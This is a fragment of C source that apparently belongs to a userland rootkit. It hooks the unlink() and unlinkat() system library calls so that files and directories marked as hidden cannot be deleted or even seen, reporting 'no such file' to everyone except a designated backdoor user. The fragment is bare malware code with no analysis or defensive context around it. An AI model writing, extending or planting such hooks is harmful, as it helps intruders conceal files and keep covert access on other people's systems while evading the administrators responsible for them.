int unlink(const char *pathname)
{
    hook(CUNLINK);
    if(is_bdusr()) return (long)call(CUNLINK, pathname);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CUNLINK, pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
    hook(CUNLINKAT);
    if(is_bdusr()) return (long)call(CUNLINKAT, dirfd, pathname, flags);
    if(hidden_path(pathname) || hidden_fd(dirfd)) { errno = ENOENT; return -1; }
    return (long)call(CUNLINKAT, dirfd, pathname, flags);
}
